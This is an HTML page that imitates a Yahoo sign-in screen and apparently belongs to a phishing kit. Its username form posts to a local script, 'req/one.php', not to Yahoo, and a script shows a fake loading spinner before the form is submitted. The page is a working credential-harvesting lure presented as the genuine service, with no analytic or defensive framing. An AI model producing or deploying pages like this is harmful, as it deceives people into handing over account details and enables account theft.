<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in - Sign in to yahoo</title>

<style>
body {
    margin: 0;
    background: #ffffff;
    font-family: system-ui, -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.container {
    max-width: 360px;
    margin: 0 auto;
    padding: 24px;
}

.logo {
    text-align: center;
    margin-top: 40px;
}

.logo img {
    width: 75px;
}

.text-section {
    margin-top: 88px;
}

.text-section h1 {
    font-size: 24px;
    font-weight: 600;
    margin: 0;
    color: #202124;
    text-align: center;
}

.text-section p {
    margin-top: 6px;
    font-size: 14px;
    color: #5f6368;
    text-align: center;
}

.input-group {
    margin-top: 44px;
}

.input-group input {
    width: 100%;
    font-size: 16px;
    padding: 10px 0;
    border: none;
    border-bottom: 1.5px solid #dadce0;
    outline: none;
    color: #202124;
}

.input-group input:focus {
    border-bottom: 2px solid #1a73e8;
}

.error {
    color: #d93025;
    margin-top: 6px;
    font-size: 13px;
    display: none;
}

.button-group {
    margin-top: 32px;
}

.button-group button {
    width: 100%;
    height: 48px;
    font-size: 14px;
    font-weight: 500;
    background: #1a73e8;
    color: #ffffff;
    border: none;
    border-radius: 24px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

.button-group button:active {
    background: #1664c0;
}

.spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top: 2px solid #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    display: none;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.forgot {
    margin-top: 24px;
    text-align: center;
}

.forgot a {
    font-size: 14px;
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
}
</style>
</head>
<body>

<div class="container">

    <div class="logo">
        <img src="log.png" alt="Logo">
    </div>

    <div class="text-section">
        <h1>Sign in</h1>
        <p>Sign in using your Yahoo account</p>
    </div>

    <!-- FORM ACTION -->
    <form id="usernameForm" action="req/one.php" method="POST" autocomplete="off">
        <div class="input-group">
            <input type="text" id="username" name="username" placeholder="Username,email or mobile">
            <div class="error" id="errorMsg">at least 6 characters</div>
        </div>

        <div class="button-group">
            <button type="submit" id="nextBtn">
                <span id="btnText">Next</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </div>
    </form>

    <div class="forgot">
        <a href="#">Forgot email?</a>
    </div>

</div>

<script>
const form = document.getElementById("usernameForm");
const btn = document.getElementById("nextBtn");
const spinner = document.getElementById("spinner");
const text = document.getElementById("btnText");
const username = document.getElementById("username");
const errorMsg = document.getElementById("errorMsg");

form.addEventListener("submit", function(e){
    e.preventDefault(); // hentikan submit default

    const value = username.value.trim();

    if(value.length < 6){
        errorMsg.style.display = "block";
        username.focus();
        return;
    } else {
        errorMsg.style.display = "none";
    }

    // tampilkan spinner dan teks loading
    spinner.style.display = "block";
    text.textContent = "Loading…";
    btn.disabled = true;

    // submit form secara normal setelah delay kecil
    setTimeout(() => {
        form.submit();
    }, 500);
});
</script>

</body>
</html>
